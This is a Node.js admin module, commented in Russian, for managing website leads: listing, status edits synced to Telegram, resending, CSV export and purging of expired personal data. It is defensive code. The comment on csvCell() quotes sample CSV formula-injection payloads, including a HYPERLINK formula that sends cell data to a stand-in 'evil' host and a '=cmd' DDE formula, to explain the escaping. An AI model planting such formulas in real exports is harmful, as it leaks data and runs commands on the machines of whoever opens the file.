// Заявки в админке: список с фильтрами, смена статуса, повторная отправка
// в Telegram и выгрузка в CSV.
//
// ЗДЕСЬ ЛЕЖАТ ПЕРСОНАЛЬНЫЕ ДАННЫЕ, и это определяет почти все решения файла:
//
//   - выгрузку и просмотр разрешаем не всем подряд, а по роли, и КАЖДОЕ
//     обращение к выгрузке пишется в audit_log: «кто и сколько строк с ПДн
//     скачал» — это первое, что спрашивают, когда база всплывает не там;
//   - в diff аудита не попадают ни имя, ни телефон, ни текст заявки: журнал
//     живёт дольше самих заявок (у них есть purge_after) и уезжает в бэкап,
//     и дублировать в него ПДн значит обойти собственный же срок хранения;
//   - gcLeads() физически удаляет строки с наступившим purge_after — срок
//     хранения обязан наступать сам, без чьей-либо кнопки.
//
// ФОРМУЛЬНАЯ ИНЪЕКЦИЯ В CSV — отдельная тема, см. csvCell(): экранирования
// по RFC 4180 для выгрузки НЕДОСТАТОЧНО.
//
// ПОВТОРНАЯ ОТПРАВКА существует потому, что заявка пишется в базу ДО обращения
// к Telegram (см. server/routes/public.lead.js): при недоступном боте клиент
// уже получил «спасибо», а сообщение в чат не ушло. Такая заявка видна в списке
// с telegram_status = 'failed', и её можно дослать, не выпрашивая у клиента
// повторную отправку формы.

import { URLSearchParams } from 'node:url'
import { randomUUID } from 'node:crypto'

import { createDeliveryRecoveryService } from '../application/delivery-recovery.js'
import { createLeadDeliveryService } from '../application/lead-delivery.js'
import { callbackSecretFor } from '../application/telegram-crm.js'
import { buildStatusKeyboard, renderLeadCard } from '../domain/lead-crm.js'
import { verifyCsrf } from '../auth/csrf.js'
import { denyAsNotFound, requireActive } from '../auth/guard.js'
import { config } from '../config.js'
import { readJson } from '../http/body.js'
import { json, securityHeaders } from '../http/respond.js'
import { ensureRequestContext } from '../http/runtime-request-context.js'
import { createRateLimiter } from '../lib/ratelimit.js'
import { telegramGateway } from '../integrations/telegram.js'
import { CAPABILITY, hasCapability } from '../policies/capabilities.js'
import {
  formatTimestamp,
  renderLeadMessage,
  resolveTelegram,
} from './admin.settings.js'

// Смотреть заявки может кто угодно из админки: это рабочий инструмент отдела
// продаж. Менять и досылать — все, кроме наблюдателя. Выгружать пачку ПДн
// одним файлом — только те, кто отвечает за сайт целиком.
// Те же значения, что в CHECK таблицы leads. Дублируются намеренно: опечатка
// должна отвергаться маршрутом с понятной ошибкой, а не ронять INSERT.
const LEAD_STATUSES = Object.freeze(['new', 'in_progress', 'done', 'spam'])

const NOTE_MAX = 2000
const BODY_LIMIT = 8 * 1024

const DEFAULT_LIMIT = 50
const MAX_LIMIT = 200
// Потолок для устаревшего offset-режима: сто страниц по MAX_LIMIT. Дальше
// клиент обязан пользоваться курсором (CR-047).
const MAX_OFFSET = 20_000

// Потолок выгрузки. Дело не в размере файла, а в памяти процесса: ответ
// собирается целиком в буфер, а на shared-хостинге процессов несколько
// и памяти на всех немного. 5000 строк — это годы работы этой формы.
const MAX_EXPORT = 5000

// Повторная отправка бьёт в тот же чат, что и заявки. Ограничение спасает
// от «нажму ещё раз, вдруг дойдёт» на десять кнопок подряд.
const RESEND_WINDOW_MS = 5 * 60_000
const RESEND_MAX = 20

// Узбекистан круглый год на UTC+5 (переход на летнее время отменён в 1995-м).
// Дата без времени в фильтре — это местный день, а не UTC-сутки: менеджер
// пишет «за 3 марта», имея в виду свой рабочий день, и пятичасовой сдвиг
// иначе утаскивал бы вечерние заявки в соседние сутки.
const TASHKENT_TZ = '+05:00'

const DATE_ONLY_PATTERN = /^\d{4}-\d{2}-\d{2}$/
const ID_PATTERN = /^[1-9]\d{0,9}$/

// ---------------------------------------------------------------------------
// SQL
// ---------------------------------------------------------------------------

// LEFT JOIN, а не подзапрос: handled_by обнуляется при удалении пользователя
// (ON DELETE SET NULL), и заявка обязана остаться в списке без ответственного.
const SQL_SELECT = `
  SELECT l.id, l.created_at, l.name, l.phone, l.message, l.locale, l.page_path,
         l.delivery_state, l.telegram_status, l.telegram_message_id, l.telegram_error,
         l.status, l.note, l.purge_after, l.status_source, l.status_actor,
         l.status_changed_at, l.telegram_chat_id, u.username AS handled_by
    FROM leads l
    LEFT JOIN users u ON u.id = l.handled_by
`

const SQL_COUNT = 'SELECT COUNT(*) AS n FROM leads l'

const SQL_ONE = `
  SELECT id, created_at, name, phone, message, locale, status,
         delivery_state, telegram_status, telegram_message_id
    FROM leads
   WHERE id = ?
`

const SQL_AUDIT = `
  INSERT INTO audit_log (at, user_id, actor, action, entity, entity_id, ip_hash, diff, result)
  VALUES (?, ?, ?, ?, 'lead', ?, ?, ?, ?)
`

const SQL_PURGE = 'DELETE FROM leads WHERE purge_after <= ?'

/**
 * Запись в журнал. ПДн заявки (имя, телефон, текст) в diff не попадают —
 * см. шапку файла: audit_log переживает purge_after и обошёл бы его.
 */
const audit = (db, entry) => {
  try {
    db.run(SQL_AUDIT, [
      entry.at ?? Date.now(),
      entry.userId ?? null,
      entry.actor,
      entry.action,
      entry.entityId == null ? null : String(entry.entityId),
      entry.ipHash ?? null,
      entry.diff == null ? null : JSON.stringify(entry.diff),
      entry.result ?? 'ok',
    ])
  } catch (error) {
    console.error(`[leads] аудит не записан (${entry.action}): ${error.message}`)
  }
}

// ---------------------------------------------------------------------------
// Фильтры
// ---------------------------------------------------------------------------

/**
 * Параметры строки запроса. Роутер отдаёт уже нормализованный путь без query
 * (см. normalizePath в server/app.js), поэтому разбираем req.url сами.
 * Длину строки запроса ограничивает тот же app.js (MAX_URL_LENGTH).
 */
const queryOf = (req) => {
  const url = typeof req.url === 'string' ? req.url : ''
  const mark = url.indexOf('?')
  if (mark === -1) return new URLSearchParams()

  const raw = url.slice(mark + 1).split('#')[0]
  return new URLSearchParams(raw)
}

/**
 * Границу дня разбираем через Date.parse с явным смещением: местная зона
 * процесса на хостинге — UTC, локально — какая угодно, и полагаться на неё
 * значит получать разные результаты в разных окружениях.
 */
const parseBound = (raw, endOfDay) => {
  const value = String(raw ?? '').trim()
  if (!value) return { ok: true, value: null }

  if (DATE_ONLY_PATTERN.test(value)) {
    const time = endOfDay ? '23:59:59.999' : '00:00:00.000'
    const parsed = Date.parse(`${value}T${time}${TASHKENT_TZ}`)
    return Number.isFinite(parsed) ? { ok: true, value: parsed } : { ok: false }
  }

  // Второй допустимый вид — epoch в миллисекундах: так фильтр переживает
  // «показать всё после этой заявки» из интерфейса без обратного форматирования.
  if (/^\d{1,15}$/.test(value)) return { ok: true, value: Number(value) }

  return { ok: false }
}

const parseIntParam = (raw, fallback, min, max) => {
  const value = String(raw ?? '').trim()
  if (!value) return fallback
  if (!/^\d{1,9}$/.test(value)) return null
  const parsed = Number(value)
  return parsed >= min && parsed <= max ? parsed : null
}

// CR-047. Курсор — это позиция в уже зафиксированном порядке
// (created_at DESC, id DESC), а не смещение.
//
// ПОЧЕМУ НЕ OFFSET. При OFFSET SQLite обязана прочитать и выбросить все
// пропускаемые строки, поэтому стоимость страницы растёт линейно с её номером.
// Хуже того, между запросами двух соседних страниц может приехать новая заявка,
// и тогда одна строка либо повторится, либо будет пропущена — на списке
// персональных данных это означает «заявку никто не увидел».
//
// ПОЧЕМУ БЕЗ ПОДПИСИ. Курсор не даёт никаких прав: это пара «отметка времени,
// идентификатор», которую клиент и так видит в теле ответа. Подпись защищала бы
// от подделки того, что подделывать бессмысленно, но потребовала бы секрет
// и его ротацию. Вместо этого — строгий разбор: ровно два целых числа,
// иначе 400.
const CURSOR_PATTERN = /^(\d{1,15})\.(\d{1,15})$/

const encodeCursor = (row) => `${Number(row.created_at)}.${Number(row.id)}`

const parseCursor = (raw) => {
  const value = String(raw ?? '').trim()
  if (!value) return { ok: true, value: null }
  const match = CURSOR_PATTERN.exec(value)
  if (!match) return { ok: false }
  const createdAt = Number(match[1])
  const id = Number(match[2])
  if (!Number.isSafeInteger(createdAt) || !Number.isSafeInteger(id)) return { ok: false }
  return { ok: true, value: { createdAt, id } }
}

/**
 * Условия WHERE и параметры к ним. Всё через плейсхолдеры: значения приходят
 * из строки запроса, и склейка их в SQL была бы инъекцией даже при «безобидном»
 * фильтре по статусу.
 *
 * @returns {{ok: true, where: string, params: Array, filters: object}
 *          |{ok: false, error: string}}
 */
const buildFilter = (query) => {
  const clauses = []
  const params = []
  const filters = {}

  const status = String(query.get('status') ?? '').trim()
  if (status && status !== 'all') {
    if (!LEAD_STATUSES.includes(status)) return { ok: false, error: 'invalid_status' }
    clauses.push('l.status = ?')
    params.push(status)
    filters.status = status
  }

  const from = parseBound(query.get('from'), false)
  if (!from.ok) return { ok: false, error: 'invalid_from' }
  if (from.value != null) {
    clauses.push('l.created_at >= ?')
    params.push(from.value)
    filters.from = from.value
  }

  const to = parseBound(query.get('to'), true)
  if (!to.ok) return { ok: false, error: 'invalid_to' }
  if (to.value != null) {
    clauses.push('l.created_at <= ?')
    params.push(to.value)
    filters.to = to.value
  }

  // Поиск по телефону. От запроса оставляем только цифры, поэтому в шаблон
  // LIKE физически не может попасть ни '%', ни '_' — экранировать нечего,
  // а менеджер ищет по любому куску номера, как он его помнит.
  const digits = String(query.get('phone') ?? query.get('q') ?? '').replace(/\D/g, '')
  if (digits) {
    clauses.push('l.phone LIKE ?')
    params.push(`%${digits}%`)
    filters.phone = true
  }

  const telegram = String(query.get('telegram') ?? '').trim()
  if (telegram === 'undelivered') {
    // Everything except a confirmed sent state needs operational attention.
    clauses.push(`l.delivery_state <> 'sent'`)
    filters.telegram = telegram
  }

  return {
    ok: true,
    where: clauses.length ? ` WHERE ${clauses.join(' AND ')}` : '',
    params,
    filters,
  }
}

// Порядок фиксирован: id вторым ключом, потому что created_at у двух заявок,
// отправленных в одну миллисекунду, совпадает, и без него их взаимный порядок
// определял бы планировщик — то есть страницы пагинации могли бы дублировать
// одну заявку и терять другую.
const ORDER = ' ORDER BY l.created_at DESC, l.id DESC'

// ---------------------------------------------------------------------------
// Доступ
// ---------------------------------------------------------------------------

const limiters = new WeakMap()

const limiterFor = (db) => {
  let limiter = limiters.get(db)
  if (!limiter) {
    limiter = createRateLimiter(db)
    limiters.set(db, limiter)
  }
  return limiter
}

/**
 * Живая сессия, нужная роль и, для мутаций, пройденный CSRF.
 *
 * Непройденная авторизация отвечает НЕОТЛИЧИМО от несуществующего адреса:
 * 401 на /api/admin/* сработал бы оракулом «здесь есть админка», а весь
 * расчёт в том, что путь админки не угадывается (см. server/auth/guard.js).
 * Отказ по роли — честный 403: человек уже внутри, скрывать нечего.
 *
 * @returns {{user: object, ipHash: string}|null} null — ответ уже отправлен
 */
const authorize = async (db, req, res, options = {}) => {
  const { capability, mutation = false, contentTypes, action = 'lead.denied' } = options

  const access = requireActive(db, req)
  if (!access.ok) {
    await denyAsNotFound(req, res)
    return null
  }

  if (mutation) {
    const csrf = verifyCsrf(req, access.session, {
      publicOrigin: config.publicOrigin,
      ...(contentTypes === undefined ? {} : { contentTypes }),
    })
    if (!csrf.ok) {
      json(res, csrf.error === 'unsupported_media_type' ? 415 : 403, {
        ok: false,
        error: csrf.error,
      })
      return null
    }
  }

  const { ipHash } = ensureRequestContext(req)

  if (!hasCapability(access.user, capability)) {
    audit(db, {
      userId: access.user.id,
      actor: access.user.username,
      action,
      ipHash,
      diff: { role: access.user.role },
      result: 'denied',
    })
    json(res, 403, { ok: false, error: 'forbidden' })
    return null
  }

  return { user: access.user, session: access.session, ipHash }
}

// ---------------------------------------------------------------------------
// GET /api/admin/leads
// ---------------------------------------------------------------------------

const viewLead = (row) => ({
  id: row.id,
  createdAt: row.created_at,
  name: row.name,
  phone: row.phone,
  message: row.message,
  locale: row.locale,
  pagePath: row.page_path,
  status: row.status,
  note: row.note,
  telegramStatus: row.delivery_state || row.telegram_status,
  telegramMessageId: row.telegram_message_id,
  telegramError: row.telegram_error,
  handledBy: row.handled_by ?? null,
  purgeAfter: row.purge_after,
  // Откуда пришла последняя смена статуса. Без этого менеджер, открывший
  // панель, видит статус «в работе» и не знает, кто его поставил — коллега
  // из чата или он сам вчера.
  statusSource: row.status_source ?? null,
  statusActor: row.status_actor ?? null,
  statusChangedAt: row.status_changed_at ?? null,
})

const listHandler = (db) => async (req, res) => {
  const ctx = await authorize(db, req, res, {
    capability: CAPABILITY.LEADS_READ,
    action: 'lead.list',
  })
  if (!ctx) return

  const query = queryOf(req)
  const filter = buildFilter(query)
  if (!filter.ok) {
    json(res, 400, { ok: false, error: filter.error })
    return
  }

  const limit = parseIntParam(query.get('limit'), DEFAULT_LIMIT, 1, MAX_LIMIT)
  // Смещение остаётся только ради совместимости со старым клиентом и потому
  // ограничено сотней страниц: прежний потолок в миллион означал обещание
  // прочитать и выбросить миллион строк по одному запросу из админки.
  const offset = parseIntParam(query.get('offset'), 0, 0, MAX_OFFSET)
  const cursor = parseCursor(query.get('cursor'))
  if (limit === null || offset === null || !cursor.ok) {
    json(res, 400, { ok: false, error: 'invalid_pagination' })
    return
  }
  if (cursor.value && offset > 0) {
    // Две разные позиции в одном запросе — это всегда ошибка клиента,
    // и молча выбрать одну значит однажды пропустить страницу.
    json(res, 400, { ok: false, error: 'invalid_pagination' })
    return
  }

  // total считаем отдельным запросом, а не по длине выборки: пагинация должна
  // знать, сколько всего заявок подходит под фильтр, а не сколько влезло
  // на страницу.
  const total = db.get(`${SQL_COUNT}${filter.where}`, filter.params)?.n ?? 0

  // Берём на одну строку больше запрошенного: наличие «лишней» строки — это
  // и есть ответ на вопрос, есть ли следующая страница, и он не требует
  // второго запроса.
  const params = [...filter.params]
  let where = filter.where
  if (cursor.value) {
    // Сравнение кортежей повторяет порядок сортировки один в один. Именно оно
    // делает страницы корректными при одинаковом created_at: при равенстве
    // отметок времени решает id, и строка не может ни повториться, ни пропасть.
    where += `${where ? ' AND' : ' WHERE'} (l.created_at, l.id) < (?, ?)`
    params.push(cursor.value.createdAt, cursor.value.id)
  }

  const sql = cursor.value
    ? `${SQL_SELECT}${where}${ORDER} LIMIT ?`
    : `${SQL_SELECT}${where}${ORDER} LIMIT ? OFFSET ?`
  const rows = db.all(sql, cursor.value ? [...params, limit + 1] : [...params, limit + 1, offset])

  const page = rows.slice(0, limit)
  const nextCursor = rows.length > limit && page.length > 0 ? encodeCursor(page[page.length - 1]) : null

  json(res, 200, {
    ok: true,
    items: page.map(viewLead),
    total,
    limit,
    offset,
    nextCursor,
  })
}

// ---------------------------------------------------------------------------
// PATCH /api/admin/leads/:id
// ---------------------------------------------------------------------------

/** Есть ли в строке управляющие символы. Без регулярного выражения: разбор
 *  по кодам читается однозначно и не требует отключать правило линтера. */
const hasControls = (text, allowNewline) => {
  for (const char of text) {
    const code = char.codePointAt(0)
    if (code === 0x0a && allowNewline) continue
    if (code === 0x09 && allowNewline) continue
    if (code < 0x20 || code === 0x7f) return true
  }
  return false
}

const parseId = (value) => (ID_PATTERN.test(String(value ?? '')) ? Number(value) : null)

/**
 * Перерисовывает карточку заявки в чате после правки статуса из панели.
 *
 * Возвращает признак, а не бросает: доставка карточки — не условие успеха
 * правки. Заявка уже сохранена, и падать здесь значило бы откатывать работу
 * менеджера из-за недоступного Telegram.
 *
 * @returns {Promise<boolean|null>} null — синхронизировать было нечего
 */
const syncCardToChat = async (db, lead, actor, now) => {
  // Карточки может не быть вовсе: заявка не доставлена, отправка выключена
  // или строка создана до появления CRM.
  const messageId = lead.telegram_message_id
  const chatId = lead.telegram_chat_id
  if (!messageId || !chatId) return null

  const telegram = resolveTelegram(db)
  if (!telegram.enabled || !telegram.botToken) return null

  const card = renderLeadCard({
    template: telegram.template,
    lead,
    status: lead.status,
    actor,
    at: now,
    secret: callbackSecretFor(config.appSecret),
  })

  const result = await telegramGateway.editMessageText(
    {
      chat_id: chatId,
      message_id: messageId,
      text: card.text,
      parse_mode: 'MarkdownV2',
      disable_web_page_preview: true,
      reply_markup: card.replyMarkup,
    },
    { botToken: telegram.botToken, apiBase: telegram.apiBase }
  )

  if (!result.ok) {
    // «Message is not modified» — не ошибка: статус мог совпасть с тем, что
    // уже нарисовано. Остальное стоит увидеть в логе.
    if (!/not modified/i.test(result.description || '')) {
      console.warn(`[leads] карточка ${lead.id} в чате не обновлена: ${result.error}`)
    }
    return false
  }

  return true
}

const patchHandler = (db) => async (req, res, params) => {
  const ctx = await authorize(db, req, res, {
    capability: CAPABILITY.LEADS_WRITE,
    mutation: true,
    action: 'lead.update',
  })
  if (!ctx) return

  const body = await readJson(req, { limit: BODY_LIMIT })
  if (!body.ok) {
    json(res, body.error === 'payload_too_large' ? 413 : 400, { ok: false, error: body.error })
    return
  }

  const id = parseId(params?.id)
  if (id === null) {
    json(res, 404, { ok: false, error: 'lead_not_found' })
    return
  }

  const payload = body.value
  const wantsStatus = payload.status !== undefined
  const wantsNote = payload.note !== undefined

  if (!wantsStatus && !wantsNote) {
    json(res, 400, { ok: false, error: 'nothing_to_update' })
    return
  }

  let status = null
  if (wantsStatus) {
    status = typeof payload.status === 'string' ? payload.status.trim() : ''
    if (!LEAD_STATUSES.includes(status)) {
      json(res, 400, { ok: false, error: 'invalid_status' })
      return
    }
  }

  let note = null
  if (wantsNote) {
    if (payload.note === null) {
      note = ''
    } else if (typeof payload.note === 'string') {
      note = payload.note.replace(/\r\n?/g, '\n').trim()
    } else {
      json(res, 400, { ok: false, error: 'invalid_note' })
      return
    }
    if (note.length > NOTE_MAX || hasControls(note, true)) {
      json(res, 400, { ok: false, error: 'invalid_note' })
      return
    }
  }

  const now = Date.now()

  const updated = db.transaction(() => {
    const before = db.get(SQL_ONE, [id])
    if (!before) return null

    const fields = []
    const values = []

    if (wantsStatus) {
      fields.push('status = ?')
      values.push(status)
      // Источник фиксируется тем же запросом: иначе статус, поставленный
      // в панели, продолжал бы числиться за тем, кто нажал кнопку в чате
      // неделю назад.
      fields.push('status_source = ?', 'status_actor = ?', 'status_changed_at = ?')
      values.push('admin', ctx.user.username, now)
    }
    if (wantsNote) {
      // Пустая заметка — это её снятие, и в базе она должна стать NULL,
      // а не пустой строкой: иначе «заметки нет» и «заметка пустая»
      // пришлось бы различать в каждом месте, которое её читает.
      fields.push('note = ?')
      values.push(note || null)
    }

    // Ответственного проставляем на любой правке: тот, кто последним трогал
    // заявку, и есть тот, с кого спрашивать. Отдельной кнопки «взять в работу»
    // в интерфейсе нет и не нужно.
    fields.push('handled_by = ?')
    values.push(ctx.user.id)

    db.run(`UPDATE leads SET ${fields.join(', ')} WHERE id = ?`, [...values, id])

    audit(db, {
      at: now,
      userId: ctx.user.id,
      actor: ctx.user.username,
      action: 'lead.update',
      entityId: id,
      ipHash: ctx.ipHash,
      // Только переходы состояний: текст заметки писал менеджер, но лежит она
      // рядом с ПДн заявки, и дублировать её в переживающий заявку журнал
      // незачем. Достаточно факта правки.
      diff: {
        status: wantsStatus ? { before: before.status, after: status } : undefined,
        noteChanged: wantsNote || undefined,
      },
    })

    return db.get(`${SQL_SELECT} WHERE l.id = ?`, [id])
  })

  if (!updated) {
    json(res, 404, { ok: false, error: 'lead_not_found' })
    return
  }

  // Обратное направление синхронизации. Без него связь односторонняя: нажатие
  // в чате доезжает до панели, а правка из панели оставляет в чате карточку
  // с прежним статусом и галкой не на том месте. Менеджер, который смотрит
  // в чат, видит устаревшую картину и берёт в работу уже обработанную заявку.
  //
  // Результат правки от этого НЕ зависит: статус уже записан и уже отвечен
  // клиенту. Недоступный Telegram не имеет права ронять сохранение.
  let cardSynced = null
  if (wantsStatus) {
    cardSynced = await syncCardToChat(db, updated, ctx.user.username, now)
  }

  json(res, 200, {
    ok: true,
    lead: viewLead(updated),
    ...(cardSynced === null ? {} : { cardSynced }),
  })
}

// ---------------------------------------------------------------------------
// POST /api/admin/leads/:id/resend
// ---------------------------------------------------------------------------

const resendHandler = (db, delivery, recovery) => async (req, res, params) => {
  const ctx = await authorize(db, req, res, {
    capability: CAPABILITY.LEADS_RETRY,
    mutation: true,
    action: 'lead.resend',
  })
  if (!ctx) return

  // Тело не обязательно, но поток надо вычитать: CSRF требует
  // Content-Type: application/json, значит клиент пришлёт хотя бы '{}',
  // а недочитанный запрос мешает следующему в том же keep-alive-соединении.
  const body = await readJson(req, { limit: BODY_LIMIT })
  if (!body.ok) {
    json(res, body.error === 'payload_too_large' ? 413 : 400, { ok: false, error: body.error })
    return
  }

  const id = parseId(params?.id)
  if (id === null) {
    json(res, 404, { ok: false, error: 'lead_not_found' })
    return
  }

  const now = Date.now()
  const limit = limiterFor(db).hit(`lead-resend:${ctx.user.id}`, {
    windowMs: RESEND_WINDOW_MS,
    max: RESEND_MAX,
    now,
  })
  if (!limit.allowed) {
    const retryAfterSec = Math.max(1, Math.ceil((limit.resetAt - now) / 1000))
    res.setHeader('Retry-After', String(retryAfterSec))
    json(res, 429, { ok: false, error: 'rate_limited', retryAfterSec })
    return
  }

  const telegram = resolveTelegram(db)
  if (!telegram.enabled) {
    json(res, 409, { ok: false, error: 'telegram_disabled' })
    return
  }
  if (!telegram.botToken || !telegram.chatId) {
    json(res, 409, { ok: false, error: 'not_configured' })
    return
  }

  const rawIdempotency = req.headers['idempotency-key']
  const idempotencyKey =
    typeof rawIdempotency === 'string' && /^[A-Za-z0-9._:-]{8,128}$/.test(rawIdempotency)
      ? rawIdempotency
      : ensureRequestContext(req).requestId || randomUUID()

  // CR-032. Повтор — операция, чувствительная к зависшему состоянию: попытка,
  // застрявшая в `sending` после двойного отказа фиксации, отвечает
  // `delivery_in_progress` навсегда. Прогоняем восстановление до claimRetry,
  // чтобы оператор получил либо рабочий повтор, либо честное требование
  // подтвердить `delivery_unknown`, а не вечную блокировку.
  try {
    recovery.run()
  } catch (error) {
    // Восстановление не должно ронять повтор: без него оператор просто
    // увидит прежнее `delivery_in_progress`.
    console.warn(`[leads] delivery recovery skipped: ${error.message}`)
  }

  const result = await delivery.retry({
    leadId: id,
    idempotencyKey,
    actorUserId: ctx.user.id,
    force: body.value.force === true,
    confirmUnknown: body.value.confirmUnknown === true,
    telegram,
    textForLead: (lead) =>
      renderLeadMessage(telegram.template, {
        name: lead.name,
        phone: lead.phone,
        message: lead.message,
        locale: lead.locale,
        createdAt: lead.created_at,
      }),
    // Досланная карточка получает те же кнопки, что и пришедшая с сайта, но
    // отмеченным будет ТЕКУЩИЙ статус заявки, а не 'new': иначе повтор
    // выглядел бы в чате откатом уже проделанной работы.
    replyMarkupFor: (lead) =>
      buildStatusKeyboard({
        secret: callbackSecretFor(config.appSecret),
        leadId: lead.id,
        current: lead.status || 'new',
      }),
  })

  const finishedAt = Date.now()

  if (!result.ok) {
    audit(db, {
      at: finishedAt,
      userId: ctx.user.id,
      actor: ctx.user.username,
      action: 'lead.resend',
      entityId: id,
      ipHash: ctx.ipHash,
      diff: { outcome: result.error, deliveryState: result.state ?? null },
      result: result.error === 'delivery_in_progress' ? 'denied' : 'error',
    })

    const status =
      result.error === 'lead_not_found'
        ? 404
        : result.error === 'delivery_unknown'
          ? 202
          : [
                'already_sent',
                'delivery_in_progress',
                'delivery_unknown_requires_confirmation',
              ].includes(result.error)
            ? 409
            : 502
    json(res, status, {
      ok: false,
      error: result.error,
      ...(result.telegramMessageId == null
        ? {}
        : { telegramMessageId: result.telegramMessageId }),
    })
    return
  }

  audit(db, {
    at: finishedAt,
    userId: ctx.user.id,
    actor: ctx.user.username,
    action: 'lead.resend',
    entityId: id,
    ipHash: ctx.ipHash,
    diff: {
      outcome: 'sent',
      messageId: result.messageId ?? null,
      duplicate: Boolean(result.duplicate),
    },
  })

  json(res, 200, {
    ok: true,
    telegramStatus: 'sent',
    messageId: result.messageId ?? null,
    duplicate: Boolean(result.duplicate),
  })
}

// ---------------------------------------------------------------------------
// GET /api/admin/leads.csv
// ---------------------------------------------------------------------------

// Точка с запятой, а не запятая: файл открывают в Excel с русской локалью,
// где разделителем списка по умолчанию служит именно ';'. С запятой такой
// Excel сложил бы всю строку в первую ячейку.
const CSV_DELIMITER = ';'

// BOM обязателен по той же причине: без него Excel читает UTF-8 как ANSI,
// и вместо имён в файле оказываются вопросительные знаки.
const CSV_BOM = '﻿'

const CSV_HEADERS = Object.freeze([
  'id',
  'Дата',
  'Имя',
  'Телефон',
  'Сообщение',
  'Язык',
  'Страница',
  'Статус',
  'Telegram',
  'Заметка',
  'Ответственный',
])

/**
 * Одна ячейка CSV.
 *
 * ЗАЩИТА ОТ ФОРМУЛЬНОЙ ИНЪЕКЦИИ (CSV injection). Экранирования по RFC 4180
 * здесь НЕДОСТАТОЧНО: оно делает файл корректным, но Excel и LibreOffice
 * трактуют содержимое ячейки, начинающееся с '=', '+', '-', '@', табуляции
 * или возврата каретки, как ФОРМУЛУ и выполняют её при открытии файла.
 * Имя заявки — это строка, которую ввёл анонимный посетитель сайта, то есть
 * значение вида '=HYPERLINK("http://evil/?"&A1)' или '=cmd|...' попадает
 * в выгрузку напрямую и срабатывает уже на машине менеджера, а не на сервере.
 * Поэтому такие значения предваряются апострофом: для Excel это признак
 * «дальше текст», сама формула не вычисляется, а лишний знак виден глазом
 * и легко объясним.
 *
 * Порядок важен: апостроф ставится ДО кавычек, иначе он оказался бы снаружи
 * поля и сдвинул бы разбор.
 */
const csvCell = (value) => {
  let text = value == null ? '' : String(value)

  // Переводы строк и прочие управляющие символы схлопываем в пробел: внутри
  // кавычек они допустимы по RFC, но превращают таблицу в нечитаемую кашу,
  // а '\r' вдобавок открывает ту же формульную ветку в Excel.
  let clean = ''
  for (const char of text) {
    const code = char.codePointAt(0)
    clean += code < 0x20 || code === 0x7f ? ' ' : char
  }
  text = clean

  if (text && '=+-@\t\r'.includes(text[0])) text = `'${text}`

  if (text.includes('"') || text.includes(CSV_DELIMITER) || text.includes('\n')) {
    return `"${text.replace(/"/g, '""')}"`
  }
  return text
}

const csvRow = (cells) => cells.map(csvCell).join(CSV_DELIMITER)

const exportHandler = (db) => async (req, res) => {
  const ctx = await authorize(db, req, res, {
    capability: CAPABILITY.LEADS_EXPORT,
    action: 'lead.export',
  })
  if (!ctx) return

  const query = queryOf(req)
  const filter = buildFilter(query)
  if (!filter.ok) {
    json(res, 400, { ok: false, error: filter.error })
    return
  }

  const rows = db.all(`${SQL_SELECT}${filter.where}${ORDER} LIMIT ?`, [
    ...filter.params,
    MAX_EXPORT,
  ])

  const lines = [csvRow(CSV_HEADERS)]
  for (const row of rows) {
    lines.push(
      csvRow([
        row.id,
        formatTimestamp(row.created_at),
        row.name,
        row.phone,
        row.message,
        row.locale,
        row.page_path,
        row.status,
        row.delivery_state || row.telegram_status,
        row.note,
        row.handled_by,
      ])
    )
  }

  // CRLF по RFC 4180: с одиночным '\n' часть версий Excel склеивает строки.
  const body = Buffer.from(`${CSV_BOM}${lines.join('\r\n')}\r\n`, 'utf8')
  const filename = `leads-${formatTimestamp(Date.now()).slice(0, 10)}.csv`

  audit(db, {
    userId: ctx.user.id,
    actor: ctx.user.username,
    action: 'lead.export',
    ipHash: ctx.ipHash,
    // Сколько ПДн выгружено и по какому срезу. Самого телефона из фильтра
    // в журнале нет — только признак, что поиск по нему был.
    diff: { rows: rows.length, truncated: rows.length === MAX_EXPORT, ...filter.filters },
  })

  securityHeaders(res)
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/csv; charset=utf-8')
  // attachment, а не inline: файл с ПДн не должен открываться во вкладке
  // браузера и оседать в её кэше и истории.
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`)
  res.setHeader('Content-Length', String(body.length))
  res.setHeader('Cache-Control', 'no-store')
  res.end(req.method === 'HEAD' ? undefined : body)
}

// ---------------------------------------------------------------------------
// Уборка просроченных ПДн
// ---------------------------------------------------------------------------

/**
 * Удаляет заявки, у которых наступил purge_after.
 *
 * Именно DELETE, а не пометка «удалено»: срок хранения персональных данных
 * имеет смысл только тогда, когда по его истечении данных не остаётся.
 * Вызывается уборщиком (cron/периодическая задача), а не запросом
 * пользователя, поэтому актором в журнале идёт 'system'.
 *
 * Запись в audit_log делается только при непустой уборке: ежедневная строка
 * «удалено 0» превратила бы журнал в шум и вытеснила бы из него настоящие
 * события.
 *
 * @param {object} db соединение из server/db/index.js
 * @param {number} [now] момент отсечения, по умолчанию текущее время
 * @returns {number} сколько строк удалено
 */
export const gcLeads = (db, now = Date.now()) => {
  const at = Number.isFinite(now) ? now : Date.now()

  return db.transaction(() => {
    const removed = db.run(SQL_PURGE, [at]).changes ?? 0
    if (removed) {
      audit(db, {
        at,
        actor: 'system',
        action: 'lead.purge',
        diff: { removed },
      })
    }
    return removed
  })
}

// ---------------------------------------------------------------------------
// Регистрация маршрутов
// ---------------------------------------------------------------------------

/**
 * Вешает маршруты заявок на роутер API.
 *
 * @param {{register: Function}} router роутер из server/router.js
 * @param {{db: object}} deps соединение из server/db/index.js
 */
export const registerAdminLeadsRoutes = (router, deps = {}) => {
  const { db } = deps
  if (!router || typeof router.register !== 'function') {
    throw new TypeError('admin.leads: ожидается роутер из server/router.js')
  }
  if (!db || typeof db.run !== 'function') {
    throw new TypeError('admin.leads: в deps.db нужно соединение из server/db/index.js')
  }

  // '/api/admin/leads.csv' — отдельный путь, а не параметр: у роутера это
  // третий сегмент целиком, и с '/api/admin/leads' он не пересекается.
  router.register('GET', '/api/admin/leads.csv', exportHandler(db))
  router.register('GET', '/api/admin/leads', listHandler(db))
  router.register('PATCH', '/api/admin/leads/:id', patchHandler(db))
  const delivery =
    deps.deliveryService ||
    createLeadDeliveryService({
      db,
      telegramGateway: deps.telegramGateway || telegramGateway,
    })
  const recovery = deps.deliveryRecovery || createDeliveryRecoveryService({ db })
  router.register('POST', '/api/admin/leads/:id/resend', resendHandler(db, delivery, recovery))

  return router
}
